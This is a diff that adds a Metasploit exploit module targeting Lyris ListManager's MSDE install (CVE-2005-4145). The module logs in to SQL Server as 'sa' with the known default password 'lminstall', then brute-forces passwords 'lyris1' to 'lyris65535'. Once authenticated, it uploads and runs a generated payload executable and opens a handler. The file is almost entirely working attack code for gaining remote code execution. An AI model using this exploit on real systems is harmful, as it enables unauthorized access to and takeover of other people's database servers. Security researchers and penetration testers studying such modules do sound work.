@@ -1,0 +1,93 @@
+##
+# $Id: lyris_listmanager_weak_pass.rb 10394 2010-09-20 08:06:27Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::MSSQL
+	include Msf::Exploit::EXE
+
+	def initialize(info = {})
+
+		super(update_info(info,
+			'Name'           => 'Lyris ListManager MSDE Weak sa Password',
+			'Description'    => %q{
+					This module exploits a weak password vulnerability in the
+				Lyris ListManager MSDE install. During installation, the 'sa'
+				account password is set to 'lminstall'. Once the install
+				completes, it is set to 'lyris' followed by the process
+				ID of the installer. This module brute forces all possible
+				process IDs that would be used by the installer.
+			},
+			'Author'         => [ 'hdm' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 10394 $',
+			'References'     =>
+				[
+					[ 'CVE', '2005-4145'],
+					[ 'OSVDB', '21559'],
+				],
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Automatic', { } ],
+				],
+			'DefaultTarget'  => 0,
+			'DisclosureDate' => 'Dec 08 2005'
+			))
+	end
+
+	# Do not automatically run this module, it can lead to lockouts with SQL Server 2005
+	def autofilter
+		false
+	end
+
+	def exploit
+
+		# New installations use a randomly generated suffix like "lyris629dAe536F"
+		pass = nil
+
+		while(true)
+			print_status("Trying to authenticate with password 'lminstall'...")
+			if(mssql_login('sa', 'lminstall'))
+				pass = 'lminstall'
+				break
+			end
+
+			print_status("Trying to authenticate with passwords 'lyris1' to 'lyris65535'...")
+			1.upto(65535) do |pid|
+
+				if(pid % 1000 == 0)
+					print_status(" >> Completed #{pid} of 65535 authentication requests")
+				end
+
+				if(mssql_login('sa', "lyris#{pid}"))
+					pass = "lyris#{pid}"
+					break
+				end
+			end
+			print_status("This system does not appear to be exploitable")
+			return
+		end
+
+		print_status("")
+		print_status("Sucessfully authenticated to #{rhost}:#{rport} with user 'sa' and password '#{pass}'")
+		print_status("")
+
+		exe = generate_payload_exe
+		mssql_upload_exec(exe)
+
+		handler
+		disconnect
+	end
+end
